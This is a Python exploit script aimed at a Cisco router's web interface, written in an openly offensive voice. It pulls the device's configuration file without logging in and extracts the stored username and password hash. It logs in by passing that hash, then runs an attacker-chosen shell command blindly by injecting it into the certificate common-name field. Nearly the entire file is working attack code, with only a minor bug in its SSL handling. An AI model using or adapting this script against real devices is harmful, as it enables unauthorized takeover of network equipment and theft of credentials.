#!/usr/bin/python
# coding: utf-8
# includes pass the hash ;)
# basically we take the hash from the config we stole earlier
# and pass it without actually cracking it
import argparse
import requests
import sys
# nuke https warnings...
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# fucking regex
import re
import hashlib

def extract_auth_key(session, base_url):
    r = session.get(base_url, verify=False)
    auth_key = re.findall('"auth_key" value="(.*?)">', r.text)
    if len(auth_key):
        return auth_key[0]
    else:
        return None

def cisco_login(host, port, ssl, username, password):
    s = requests.Session()
    if ssl == True:
        base_url = "https://%s:%s/" %(host, port)
    else:
        base_url = "https://%s:%s/" %(host, port)
    login_url = "%scgi-bin/userLogin.cgi" %(base_url)
    print "{+} Sending request to %s to extract auth key..." %(base_url)
    auth_key = extract_auth_key(session=s, base_url=base_url)
    if auth_key != None:
        print "{*} Got auth_key value: %s" %(auth_key)
    else:
        print "{*} auth_key extraction failed. Using 1964300002 anyway"
        auth_key = "1964300002" # this seems to be a default on some?
    # now we do the login
    post_data = {"auth_key": auth_key,
                 "auth_server_pw": "Y2lzY28=",
                 "changelanguage": "",
                 "current_password": "",
                 "langName": "ENGLISH,Deutsch,Espanol,Francais,Italiano",
                 "LanguageList": "ENGLISH",
                 "login": "true",
                 "md5_old_pass": "",
                 "new_password": "",
                 "password": password,
                 "password_expired": 0,
                 "pdStrength": 0,
                 "portalname": "CommonPortal",
                 "re_new_password": "",
                 "submitStatus": 0,
                 "username": username} # this is batshit and it won't work without all these vars?!
    login = s.post(url=login_url, data=post_data, verify=False)
    if "URL=/default.htm" in login.text:
        print "{+} Login Successful, we can proceed!"
        return base_url, s # return the base url and session...
    else:
        sys.exit("{!} Login Failed, quitting time loser :(")

def pwn(base_url, session, command):
    print "{+} Ok, now to run your command: %s" %(command)
    print "{+} We don't get output so... Yeah. Shits blind."
    target_url = "%scertificate_handle2.htm?type=4" %(base_url)
    payload = "a'$(%s)'b" %(command)
    post_data = {"page": "self_generator.htm",
                 "totalRules": 1,
                 "OpenVPNRules": 30,
                 "submitStatus": 1,
                 "log_ch": 1,
                 "type": 4,
                 "Country": "A",
                 "state": "A",
                 "locality": "A",
                 "organization": "A",
                 "organization_unit": "A",
                 "email": "ab%40example.com",
                 "KeySize": 512,
                 "KeyLength": 1024,
                 "valid_days": 30,
                 "SelectSubject_c": 1,
                 "SelectSubject_s": 1,
                 "common_name": payload}
    r= session.post(url=target_url, data=post_data, verify=False)

def get_config(host, port, ssl):
    print "{+} Gonna go grab us a config file..."
    if ssl == True:
        url = "https://%s:%s/cgi-bin/config.exp" %(host, port)
    else:
        url = "http://%s:%s/cgi-bin/config.exp" %(host, port)
    try:
        print "{+} Sending request to %s" %(url)
        r = requests.get(url, verify=False)
    except Exception, e:
        sys.exit("{!} Exception while sending request, printing...\n%s" %(str(e)))
    if "sysconfig" in r.text:
        print "{*} We seem to have found a valid config!"
        return r.text
    else:
        sys.exit("{-} Config extraction failed. Quitting.")

def extract_creds(config):
    # Here we extract the USER and PASSWD lines to get the username and hash...
    print "{+} Extracting Creds..."
    username = re.findall('USERNAME=(.*?)\n', config)
    if len(username):
        username = username[0]
        print "{+} Got user: %s" %(username)
    else:
        sys.exit("{-} No user? What the fuck is this?")
    password = re.findall('PASSWD=(.*?)\n', config)
    if len(password):
        password = password[0]
        print "{+} Got password (hash): %s" %(password)
    else:
        sys.exit("{-} No password? What the fuck is this?")
    return username, password

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="Target host", required=True)
    parser.add_argument('-s', '--ssl', action="store_true", default=True, help="Use SSL")
    parser.add_argument('-p', '--port', default="443", help="Target port")
    parser.add_argument('-c', '--command', default="id", help="Command. You get no output so... Do with it as you see fit.")
    # more args to come...
    args = parser.parse_args()
    # get our config and extract USER and PASSWD parts for pwning
    config = get_config(host=args.target, port=args.port, ssl=args.ssl)
    username, password = extract_creds(config=config)
    # do login stuff...
    base_url, session = cisco_login(host=args.target, port=args.port, ssl=args.ssl, username=username, password=password)
    # we now have a session object. We can move to the next phase of attack.
    pwn(base_url=base_url, session=session, command=args.command)

if __name__ == "__main__":
    main()
